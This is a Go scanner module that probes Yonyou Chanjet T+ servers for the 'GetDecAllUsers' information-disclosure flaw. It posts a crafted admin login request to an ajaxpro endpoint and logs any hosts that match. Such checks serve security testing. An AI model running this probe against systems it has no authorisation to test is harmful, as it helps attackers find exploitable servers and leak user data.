package Scan

import (
	"fmt"
	"fupo_for_yonyou/Utils"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
	"time"
)

func GetDecAllUsersScan(address string, client *http.Client, Red string, Green string, Yellow string, Reset string, Cyan string, currentTime string) {
	GetDecAllUsers := "用友 畅捷通T+ GetDecAllUsers 信息泄露漏洞"
	urls := address + "/tplus/ajaxpro/Ufida.T.SM.Login.UIP.LoginManager,Ufida.T.SM.Login.UIP.ashx?method=CheckPassword"
	response, err := client.Post(urls, "application/json", strings.NewReader("{\"AccountNum\": \"000\", \"UserName\": \"admin\", \"Password\": \"\", \"rdpYear\": \"2023\", \"rdpMonth\": \"5\", \"rdpDate\": \"17\", \"webServiceProcessID\": \"admin\", \"ali_csessionid\": \"\", \"ali_sig\": \"\", \"ali_token\": \"\", \"ali_scene\": \"\", \"role\": \"\", \"aqdKey\": \"\", \"fromWhere\": \"browser\", \"cardNo\": \"\"}"))
	if err != nil {
		if strings.Contains(err.Error(), "An existing connection was forcibly closed by the remote host") || strings.Contains(err.Error(), "forcibly closed") {
			fmt.Printf("[%s%s%s] [%s-%s] %s 扫描时连接被目标服务器阻断\n", Cyan, currentTime, Reset, Yellow, Reset, GetDecAllUsers)
		} else {
			fmt.Printf("[%s%s%s] [%s-%s] %s 扫描时连接被重置\n", Cyan, currentTime, Reset, Yellow, Reset, GetDecAllUsers)
		}
		return
	}
	defer response.Body.Close()
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		output := fmt.Sprintf("[%s%s%s] [%s-%s] %s 读取响应内容失败: %v", Cyan, currentTime, Reset, Yellow, Reset, GetDecAllUsers, err)
		fmt.Println(output)
		return
	}
	if strings.Contains(string(body), "error") && strings.Contains(string(body), "Login") && strings.Contains(string(body), "DTO") {
		result := GetDecAllUsers + "：" + urls
		//保存文件不能用传来的currentTime，得重新定义一个格式的时间戳
		timestamp := time.Now().Format("20230712")
		filename := fmt.Sprintf("scan_result_%s.txt", timestamp)
		err := Utils.SaveResultToFile(result, filename)
		if err != nil {
			log.Println("保存结果到文件出错:", err)
		} else {

		}
		output := fmt.Sprintf("["+Green+"%s"+Reset+"] ["+Green+"+"+Reset+"] 存在%s：%s", currentTime, GetDecAllUsers, urls)
		fmt.Println(output)
	} else {
		output := fmt.Sprintf("[%s%s%s] [%s-%s] 不存在%s，状态码: %d", Cyan, currentTime, Reset, Yellow, Reset, GetDecAllUsers, response.StatusCode)
		fmt.Println(output)
	}
}
